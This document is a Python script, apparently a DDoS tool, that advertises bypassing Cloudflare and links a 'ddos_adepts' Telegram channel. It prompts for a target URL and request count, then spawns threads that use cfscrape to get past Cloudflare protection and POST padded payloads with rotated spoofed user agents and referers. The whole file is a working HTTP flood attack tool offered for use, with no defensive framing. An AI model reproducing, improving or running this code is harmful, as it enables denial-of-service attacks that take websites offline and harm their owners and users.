import cfscrape
import random
import threading
import requests
import time
print('''

██╗░░██╗████████╗████████╗██████╗░██████╗░██╗
██║░░██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║
███████║░░░██║░░░░░░██║░░░██████╔╝██████╔╝██║
██╔══██║░░░██║░░░░░░██║░░░██╔═══╝░██╔═══╝░██║
██║░░██║░░░██║░░░░░░██║░░░██║░░░░░██║░░░░░██║
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░░░░╚═╝░░░░░╚═╝
██████╗░██╗░░░██╗
██╔══██╗╚██╗░██╔╝
██████╦╝░╚████╔╝░
██╔══██╗░░╚██╔╝░░
██████╦╝░░░██║░░░
╚═════╝░░░░╚═╝░░░

██████╗░███████╗██████╗░██╗██╗░░██╗
██╔══██╗██╔════╝██╔══██╗██║██║░██╔╝
██████╔╝█████╗░░██████╦╝██║█████═╝░
██╔══██╗██╔══╝░░██╔══██╗██║██╔═██╗░
██║░░██║███████╗██████╦╝██║██║░╚██╗
╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝╚═╝░░╚═╝''')
print("I can bypass CF and just http flood!")
print("t.me/ddos_adepts")
url = input("URL with protocol http/https: ")
num_requests = int(input("Number of requests: "))
nump = int(input("Packet size in bytes(default 1024): "))
print(f"{url} {num_requests} {nump}")
input("Press Enter for start!")

user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3", 
               "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", 
               "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.3", 
               "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0", 
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"]

referers = ["http://www.google.com", "http://www.bing.com", "http://www.yahoo.com"]


def send_request():

    scraper = cfscrape.create_scraper()


    user_agent = random.choice(user_agents)
    referer = random.choice(referers)


    headers = {'User-Agent': user_agent, 'Referer': referer}


    payload = 'x' * nump


    response = scraper.post(url, headers=headers, data=payload)

    
    print(f'{response} sending packet on {url}')



for i in range(num_requests):
    thread = threading.Thread(target=send_request)
    thread.start()
